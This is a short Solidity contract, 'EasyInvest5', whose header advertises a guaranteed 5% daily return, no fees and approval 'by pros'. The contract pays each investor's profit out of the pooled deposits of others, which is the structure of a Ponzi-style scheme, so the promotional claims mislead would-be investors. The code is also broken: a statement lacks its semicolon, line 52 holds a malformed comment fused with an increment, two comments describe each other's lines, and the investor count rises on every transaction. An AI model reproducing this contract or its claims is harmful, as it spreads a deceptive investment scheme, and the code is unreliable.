1 pragma solidity ^0.4.25;
2 
3 /**
4  *
5  * Easy Investment Contract
6  *  - GAIN 5% PER 24 HOURS(every 5900 blocks)
7  *  - NO COMMISSION on your investment (every ether stays on contract's balance)
8  *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)
9  *
10  * How to use:
11  *  1. Send any amount of ether to make an investment
12  *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)
13  *  OR
14  *  2b. Send more ether to reinvest AND get your profit at the same time
15  *
16  * RECOMMENDED GAS LIMIT: 70000
17  * RECOMMENDED GAS PRICE: https://ethgasstation.info/
18  *
19  * Contract reviewed and approved by pros!
20  *
21  */
22 contract EasyInvest5 {
23     // total investors count
24     uint256 public investorsCount;
25     address[] public investors;
26     // records amounts invested
27     mapping (address => uint256) public invested;
28     // records blocks at which investments were made
29     mapping (address => uint256) atBlock;
30 
31     // this function called every time anyone sends a transaction to this contract
32     function () external payable {
33         // if sender (aka YOU) is invested more than 0 ether
34         if (invested[msg.sender] != 0 && block.number > atBlock[msg.sender]) {
35             // calculate profit amount as such:
36             // amount = (amount invested) * 5% * (blocks since last transaction) / 5900
37             // 5900 is an average block count per day produced by Ethereum blockchain
38             uint256 amount = invested[msg.sender] * 5 / 100 * (block.number - atBlock[msg.sender]) / 5900;
39             // if requested amount more than contract balance - we will send a rest
40             if (amount > this.balance) amount = this.balance;
41 
42             // send calculated amount of ether directly to sender (aka YOU)
43             msg.sender.transfer(amount);
44         } else {
45             investors.push(msg.sender);
46         }
47 
48         /* record block number of this transaction */
49         invested[msg.sender] += msg.value;
50         /* record invested amount (msg.value) of this transaction */
51         atBlock[msg.sender] = block.number
52         /*increase total investors count*/*investorsCount++;
53     }
54 }